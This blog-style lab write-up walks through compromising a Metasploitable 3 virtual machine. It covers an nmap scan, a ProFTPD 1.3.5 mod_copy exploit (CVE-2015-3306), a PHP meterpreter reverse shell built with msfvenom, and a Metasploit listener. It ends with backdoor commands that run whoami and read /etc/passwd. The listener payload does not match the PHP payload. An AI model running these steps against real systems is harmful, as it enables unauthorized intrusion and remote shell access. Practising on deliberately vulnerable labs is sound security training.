---
layout: post
title: "Metasploitable Series"
categories: ["Hands-on", "Metasploitable"]
tags: "Metasploitable Series"
---

# Metasploitable Series
## Issue 1

![Nmap Scan](/images/nmap-scan1.png)

The first step that was done was scan the machine using nmap -sV -A

The main focus in this FTP exploitation

VICTIM IP = 192.168.199.130

# FTP services

## Version : ProFTPD 1.3.5

since we get the version number I decided on using _searchsploit_ to locate any existing exploit

### Mode_copy remote command execution

- sudo python 49908.py 192.168.199.130  
  allows the remote attacker to read and write arbitary files via the side CPFR and site CPTO commands
  When running the command we were able to put a test.php in the victim!
  instead of test.php what if i uploaded a _reverse shell_ php?

### Making a backdoor php using venom

we need to upload the reverse shell php and have a listener set up to capture the connection

1. Setting up the listener using msfconsole

- msfconsole
- use exploit/multi/handler
- set Lhost 192.168.199.128
- set Lport 4444
- set payload windows/meterpreter/reverse_tcp
- run

2. Creating reverse shell using msfvenom

- msfvenom -p php/meterpreter_reverse_tcp -o shell.php LHOST=192.168.199.128 LPORT=4444

## Exploiting CVE-2015-3306

i had problems with 49908.py exploit so i used https://github.com/t0kx/exploit-CVE-2015-3306
after reading the exploit I understood that we have to add to the link the cmd command like the below:


http://192.168.199.130/backdoor.php?cmd=ls

### What we can find out

WHOAMI
http://192.168.199.130/backdoor.php?cmd=whoami _www-data_

Os Running
http://192.168.199.130/backdoor.php?cmd=uname -a _Linux metasploitable3-ub1404 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux_

Users in the machine
http://192.168.199.130/backdoor.php?cmd=cat%20/etc/passwd

users found

- luke_skywalker
- han_solo
- artoo_detoo
- leia_organa
- c_three_pio
- ben_kenobi
- darth_vader
- anakin_skywalker
- jarjar_binks
- lando_calrissian
- boba_fett
- jabba_hutt
- kylo_ren
- chewbacca
- greedo
